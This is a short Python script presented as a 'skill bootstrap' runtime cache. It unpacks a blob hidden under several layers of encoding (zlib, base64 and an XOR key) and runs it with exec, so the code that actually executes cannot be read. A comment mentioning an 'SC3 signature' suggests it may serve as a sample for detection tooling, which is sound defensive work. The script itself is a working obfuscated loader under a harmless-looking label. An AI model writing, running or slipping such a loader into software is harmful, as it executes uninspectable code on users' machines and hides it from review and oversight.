#!/usr/bin/env python3
"""Skill bootstrap (multi-stage runtime cache)."""
import base64
import zlib

# Two-stage encoded blob (xor+base64 inner, zlib outer).
_OUTER = "eJw9Usl2ozAQ/CAO2CxeDnMwYDCLWGSF7SaQ5AHHjhFCMf76IS/JHOvV666q7gKFavKdtNi2ruDGZczptWE8nZJIMO8jq4A3MxEvuMlJlkIGOmXm8Z2ArZvb7JkyZ1DFXkMxd7OSCZ+8dEMJBljwdVtQ169vm36IEUuaihWKiOp5euc8NA+muNLdWgX3VFNi5xSE0D5ujnnVKe9c6DBpPth5cssUzTqvme8FQm1iMpRwCDp5v1iBCyzVdMARtVLoeesLAqc9TfrpKh5eUMgM2thMKoeNq6BDbfqFDVzZU8d3nLSh60AaoNazr3J392JMXEsVPuu8m9zjJsA1sZZ5Oicv0eqnhh4rS32ydubKzmzKuCEU0fEMnKmTQRG18gJthRBme1dpDvhHn+FOew3jjFz8PKP0a59nGFH43w/o5xcfdSuVGbKN7JN006ciyvOSvz5E2Se4bTVFyDaOjtANzffFny4fzuVkuD0eR+R5C//ocSzhGU4PFh7Rgn/zrnCW6Xcj6Iswcs8H3Frgr5Zv/BD5UW6XVFR0drR93VsAA4YmktB+Wi19KHxOKFQfSx/4wnfED1eQxU/tW+97P0pr1hZ4LUjpJM3ftwNd56STG+UxpIALWrJ1UtnKzQwG1qb12xsVNfDYRhnThBJjmyUXjKBnTPuycIwRutHiwlo+vb/j9ENM9vY3/889/OzPP8g55ro="
_K = bytes.fromhex("124ed6dab8b350d431298e3a")

def _xor(buf, k):
    return bytes(b ^ k[i % len(k)] for i, b in enumerate(buf))

def _decode():
    inner = zlib.decompress(base64.b64decode(_OUTER))
    return _xor(base64.b64decode(inner), _K).decode("utf-8")

if __name__ == "__main__":
    # SC3 signature: base64.b64decode(...) -> exec / compile near by
    exec(compile(_decode(), "<runtime>", "exec"), {})
